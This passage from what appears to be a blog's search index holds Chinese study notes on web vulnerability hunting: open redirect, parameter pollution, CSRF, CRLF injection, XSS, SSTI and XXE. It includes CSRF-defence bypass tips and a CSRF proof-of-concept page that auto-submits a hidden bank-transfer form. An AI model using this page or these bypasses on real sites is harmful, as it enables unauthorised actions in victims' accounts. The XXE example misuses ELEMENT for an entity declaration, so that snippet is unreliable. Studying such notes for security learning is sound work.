invoke__">parse_str</span>() <span class="comment">#将字符串解析成多个变量</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variables</span>() <span class="comment">#php&lt;5.4，全局变量注册</span></span><br><span class="line"><span class="variable">$$a</span> <span class="comment">#可变变量</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Web漏洞搜索》阅读笔记</title>
      <link href="/2022/12/23/web-lou-dong-sou-suo-676da3cd74cd454595e5beca08946d17/"/>
      <url>/2022/12/23/web-lou-dong-sou-suo-676da3cd74cd454595e5beca08946d17/</url>
      
        <content type="html"><![CDATA[<h1 id="《Web漏洞搜索》"><a href="#《Web漏洞搜索》" class="headerlink" title="《Web漏洞搜索》"></a>《Web漏洞搜索》</h1><p>备注: 讲了一下跟挖漏洞相关的建议，还有一些实例<br>开始日期: December 23, 2022 5:09 PM<br>状态: 已完成</p><h1 id="开放式重定向"><a href="#开放式重定向" class="headerlink" title="开放式重定向"></a>开放式重定向</h1><aside>💡 重定向的实现一般是通过url参数，HTML<meta>刷新标签，DOM中的window对象的location属性实现的。</aside><p>简述：通过改变GET请求中包含可以控制的重定向网址，将网站重定向到我们想要的地方。</p><p>挖掘思路：</p><p>重点关注特定名称的url参数，如：url&#x3D;,redirect&#x3D;,next&#x3D;,r&#x3D;,u&#x3D;</p><p>有时候网站会对重定向的链接做一些验证，可能是只能重定向到本网站，此时就需要结合其他漏洞进行利用，比如重定向到一个可以自由编辑js代码的界面，这时候再进行一个重定向，就可以达到我们预期的结果。</p><p>有时候我们可以控制重定向网址的一部分，比如结尾，我们可以在结尾构造重定向链接，因为DNS是按照域名标记右侧优先的原则进行查询</p><h1 id="HPP（http参数污染）"><a href="#HPP（http参数污染）" class="headerlink" title="HPP（http参数污染）"></a>HPP（http参数污染）</h1><p>简述：我们的请求过程中，对http注入额外的参数，这些额外参数干扰了后端代码对正常参数的处理，从而导致了非预期的结果。</p><aside>💡 服务器端HPPP与客户端HPP的区别：对http进行参数污染之后是否在有中间的反馈。服务器端HPP只能看到后端代码运行之后的结果，而看不到中间的过程。（不用太纠结区别）</aside><p>挖掘思路：</p><ul><li>寻找与其他服务相关联的链接，因为这些链接在跳转的时候可能会传递一些可控的参数，我们通过&amp;xxx&#x3D;xxx添加新的参数（有时候需要对&amp;进行url编码为%26，改值被html编码后为&amp;amp；）。</li><li>在挖掘逻辑漏洞时可以试一下参数污染，添加相同参数绕过</li></ul><h1 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h1><p>简述：用户在一个网站上登录自己的账号，我们通过其他网站A去重定向到这个网站B，并以用户的身份发送请求。</p><p>挖掘思路：</p><ul><li>GET请求→直接在url注入要发送的参数</li><li>POST请求→后台可能用的request接受参数，同样在url注入参数。如果是后台是POST请求接受参数，那我们可以网站A去构造一个表单，如：</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">　　<span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">　　　　<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">　　　　　　<span class="keyword">function</span> <span class="title function_">steal</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">　　　　　　&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          　　　　 iframe = <span class="variable language_">document</span>.<span class="property">frames</span>[<span class="string">&quot;steal&quot;</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">　　     　　      iframe.<span class="property">document</span>.<span class="title class_">Submit</span>(<span class="string">&quot;transfer&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">　　　　　　&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">　　　　</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">　　<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">　　<span class="language-xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">οnlοad</span>=<span class="string">&quot;steal()&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">　　　　<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;steal&quot;</span> <span class="attr">display</span>=<span class="string">&quot;none&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">　　　　　　<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">name</span>=<span class="string">&quot;transfer&quot;</span>　<span class="attr">action</span>=<span class="string">&quot;http://www.myBank.com/Transfer.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;toBankId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">　　　　　　<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">　　　　<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">　　<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>向网站B发送请求，这里的type&#x3D;”hidden”可以隐藏标签，display&#x3D;”none”可以隐藏响应内容</p><ul><li>应该重点关注在服务器端执行操作的HTTP请求.有时候一些API接口也会存在CSRF。</li><li>如果网站正在使用POST请求发送CSRF令牌，我们可以尝试修改或将其删除，以验证令牌是否存在</li></ul><p>常见防御手段：</p><ul><li>网站要求以内容类型（content-type）为application&#x2F;json，带着一个CSRF token进行提交，用来验证请求的发起者。当浏览器发送application&#x2F;json请求时，会发送一个OPTIONS HTTP请求，这个请求会返回支持的HTTP请求类型和信任的源。有些情况下，我们可以通过修改content-type绕过这些措施。</li><li>扩源资源共享（CORS）定义了网站什么时候和如何互相读取响应信息。有些情况下，我们可以将content-type修改为application&#x2F;x-www-form-urlencoded，multipart&#x2F;form-data或text。plain来绕过，这样就不会发起OPTIONS HTTP请求。</li><li>将token写在某一个http中（GET，POST都有可能）。</li></ul><h1 id="CRLF注入（回车换行注入）"><a href="#CRLF注入（回车换行注入）" class="headerlink" title="CRLF注入（回车换行注入）"></a>CRLF注入（回车换行注入）</h1><p>简述：服务器和浏览器都是通过CRLF字符来识别HTTP消息中的不同部分的,我们可以在http头中加入回车换行符 \n\r，其编码形式为%0d%0a，从而修改http头的消息。进一步可以造成HTTP夹带攻击，HTTP响应攻击和XSS攻击，会话固定，缓存投毒等。</p><p>漏洞挖掘：</p><ul><li>注入点主要是重定向或者跳转的地方。要观察输出是否再返回头中，查看输入，可能是在URL值和参数，cookie中。</li><li>常见的两种情况是使用输入参数set-cookie和302跳转location处。CRLF之后，我们可以加入新的参数，或进行XSS注入。比如某一个链接：xxx.com?url&#x3D;<a href="http://www.baidu.com,然后这个www.baidu.com又出现在页面当中,此时我们可以将这个重定向漏洞进行进一步的升级,改为xxx.com/?url=%0D%0A">www.baidu.com，然后这个www.baidu.com又出现在页面当中，此时我们可以将这个重定向漏洞进行进一步的升级，改为xxx.com?url=%0d%0a</a><xss payload>，从而注入xss。</li></ul><p>常见防御手段：</p><ul><li>过滤CRLF字符</li></ul><h1 id="缓存投毒"><a href="#缓存投毒" class="headerlink" title="缓存投毒"></a>缓存投毒</h1><p>简述：服务器为了节省资源，当多个用户请求同一资源时，服务端会返回预先存好的资源。我们可以通过修改这个缓存造成缓存投毒</p><h1 id="XXS"><a href="#XXS" class="headerlink" title="XXS"></a>XXS</h1><p>漏洞挖掘：</p><ul><li>有时候注入一个xss并不会马上发生反馈，比如在用户名注入xss payload，但在个人主页上并没有反馈，但在邮箱功能却能够实现。所以要关注多个地方，看xss是否在某个不显著的地方实现了。</li><li>有时候xss会被js代码过滤，编码，我们可以通过重写此js代码绕过</li><li>有些网站使用修改xss（移除字符，属性等）进行输入过滤，我们可以通过分析它的机制，利用这个修改机制绕过</li><li>网站可能只对输入进行过滤，而页面呈现没有过滤。（利用条件较苛刻）</li><li>多关注能反馈到页面的输入</li></ul><h1 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h1><p>漏洞挖掘：常用49，&lt;%&#x3D;xxx%&gt;进行测试</p><ul><li>在寻找漏洞前，最好对网站进行信息收集，确认一下使用的相关技术（比如网站的框架，前端呈现的引擎，CMS等）</li></ul><h1 id="XXE-外部实体注入"><a href="#XXE-外部实体注入" class="headerlink" title="XXE(外部实体注入)"></a>XXE(外部实体注入)</h1><p>简述：</p><p>XML 和 HTML 为不同的目的而设计：</p><ul><li>XML 被设计用来传输和存储数据，其焦点是数据的内容。</li><li>HTML 被设计用来显示数据，其焦点是数据的外观</li></ul><p>基本组成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span><span class="meta">?&gt;</span> <span class="comment">#声明头</span></span><br><span class="line">&lt;note&gt; <span class="comment">#内容，标签名是可以自定义的</span></span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;<span class="keyword">from</span>&gt;Jani&lt;/<span class="keyword">from</span>&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body fun=<span class="string">&quot;1&quot;</span>&gt;Don<span class="string">&#x27;t forget me this weekend!&lt;/body&gt; #带了一个fun属性</span></span><br><span class="line"><span class="string">&lt;website&gt;&amp;url;&lt;/website&gt;</span></span><br><span class="line"><span class="string">&lt;/note&gt;</span></span><br></pre></td></tr></table></figure><p>XML实体：相当于定义一个变量，避免多次调用时重复编写。实体名为以&amp;开头，以;结尾。如果实体需要被计算，那么将&amp;替换为%，即为%xxx;</p><p>DTD :定义文档结构，支持外部DTD和内部DTD：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE note [ </span><br><span class="line">&lt;!ELEMENT <span class="title function_ invoke__">note</span> (to,<span class="keyword">from</span>,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT <span class="title function_ invoke__">to</span> (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT <span class="keyword">from</span> (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">&lt;!ELEMENT <span class="title function_ invoke__">heading</span> (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT <span class="title function_ invoke__">body</span> (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT url SYSTEM <span class="string">&quot;website.txt&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">...此处为上一个代码块的代码</span><br><span class="line"><span class="comment">###</span></span><br><span class="line">&lt;!DOCTYPE note []&gt;定义此文档是 note 类型的文档。</span><br><span class="line">&lt;!ELEMENT note&gt;定义 note 元素有四个元素：<span class="string">&quot;to、from、heading,、body&quot;</span></span><br><span class="line">&lt;!ELEMENT to&gt; 定义 to 元素为 <span class="string">&quot;#PCDATA&quot;</span> 类型（下面的同理）</span><br><span class="line">ps：</span><br><span class="line"><span class="comment">#PCDATA 表示可进行HTML解析的字符数据，不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;amp;、&amp;lt; 以及 &amp;gt; 实体来分别替换它们。</span></span><br><span class="line"><span class="comment">#CDdata 表示不会被解析器解析的文本</span></span><br><span class="line">ANY 定义标签包含任何可解析的数据</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT url SYSTEM <span class="string">&quot;website.txt&quot;</span>&gt; 使用SYSTEM属性告诉解析器使用url占位符获取website.txt文件的内容</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>漏洞挖掘：</p><ul><li>注意具有xml，可以上传xml的地方</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
